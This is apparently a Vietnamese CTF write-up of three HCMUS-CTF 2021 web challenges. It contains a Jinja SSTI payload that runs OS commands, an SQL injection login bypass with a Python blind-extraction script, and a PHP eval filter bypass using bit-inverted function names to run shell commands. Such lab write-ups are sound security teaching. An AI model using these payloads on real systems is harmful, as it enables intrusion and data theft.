# WRITE-UP-HCMUS-CTF-2021
## 1. Nothingness
+ Lỗi: SSTI
+ Payload: <pre><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code></pre>
+ ls ra 1 thư mục nữa thì thấy có file 'flag_HKOOS2lrdD'
+ Submit flag thôi: HCMUS-CTF{404_teMpl4t3_1njEctIon}

## 2. EasyLogin
+ Tìm cách đăng nhập admin. Thử <pre><code>admin' or 1=1--</code></pre> Thì ta nhận được được Nothing special
+ Order by thì biết được là SQLite3 và bảng này gồm 2 cột
+ Thử ``union select 'admin', 2`` thì trang web trả về một tấm hình
+ Thử ``admin' or 1=2--`` thì nó vẫn ra tấm hình ban nãy -> Nếu đúng thì 'Nothing special' sai thì 'Well done' -> Burteforce
+ Brute tên bảng: 
<pre><code>
tbl_name = 'CREATE TABLE flagtablewithrandomname'
tbl = 'users, flagtablewithrandomname1'
sql = 'CREATE TABLE user(username, passw'
sql2 = ''
flag = ''
for i in range(1,50):
    for j in range(32,127):
        print(f"i\t\t{i}\t\t{j}",end='\r')
        resp = requests.post(url, data={
            "username": f"admin' or (select substr(flag,{i},1) FROM flagtablewithrandomname)=char({j})--",
            "passwd": "guest"
        })
        # print(resp.text)
        if "Nothing" in resp.text:
            flag += chr(j)
            print(f"tbl_name = {flag}")
            break 
</code></pre>
May mắn là tìm ra ngay flag lun:
+ ![image](https://user-images.githubusercontent.com/58381595/119288538-eccbb980-bc72-11eb-8b1f-e5d5e9401237.png)

# 3. SimpleCalculator
+ Sử dụng PHP eval() để thực hiện lệnh dc nhập vào -> WAF bypass
+ Chặn quote, alphabet và giới hạn kí tự-> sửa dụng '~' để đảo bit
+ ![image](https://user-images.githubusercontent.com/58381595/119289646-2a314680-bc75-11eb-9e46-b204ac314818.png)
+ Thử đảo phpinfo thành ' %8F%97%8F%96%91%99%90 ' rồi gửi ``(~%8F%97%8F%96%91%99%90)()`` Thì quả thật lệnh phpinfo() đã được thực hiện
+ system('ls -l') xem có gì nào : ``(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D2%93)``
> Warning: Use of undefined constant ���ғ - assumed '���ғ' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
total 4 -rwxrw-r--. 1 www-data root 856 May 18 11:52 index.php drwxr-xr-x. 1 www-data root 23 May 18 11:52 static drwxr-xr-x. 1 www-data root 23 May 18 11:52 static
+ Ra ngoài gốc lun xem có gì
> Warning: Use of undefined constant ���ғ�� - assumed '���ғ��' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
total 4 drwxr-xr-x. 1 root root 28 May 12 12:48 bin drwxr-xr-x. 2 root root 6 Mar 19 23:44 boot drwxr-xr-x. 5 root root 360 May 23 13:13 dev drwxr-xr-x. 1 root root 66 May 23 13:13 etc -rwxrw-r--. 1 root root 25 May 18 11:52 fl4ggggH3reeeeeeeeeee drwxr-xr-x. 2 root root 6 Mar 19 23:44 home drwxr-xr-x. 1 root root 21 May 12 12:48 lib drwxr-xr-x. 2 root root 34 May 11 00:00 lib64 drwxr-xr-x. 2 root root 6 May 11 00:00 media drwxr-xr-x. 2 root root 6 May 11 00:00 mnt drwxr-xr-x. 2 root root 6 May 11 00:00 opt dr-xr-xr-x. 580 root root 0 May 23 13:13 proc drwx------. 1 root root 6 May 12 13:41 root drwxr-xr-x. 1 root root 36 May 23 13:13 run drwxr-xr-x. 1 root root 20 May 12 12:48 sbin drwxr-xr-x. 2 root root 6 May 11 00:00 srv dr-xr-xr-x. 13 root root 0 May 11 11:41 sys drwxrwxrwt. 1 root root 6 May 12 13:41 tmp drwxr-xr-x. 1 root root 19 May 11 00:00 usr drwxr-xr-x. 1 root root 17 May 12 12:43 var drwxr-xr-x. 1 root root 17 May 12 12:43 var
+ system('nl /*') -> Flag: HCMUS-CTF{d4ngErous_eVal}
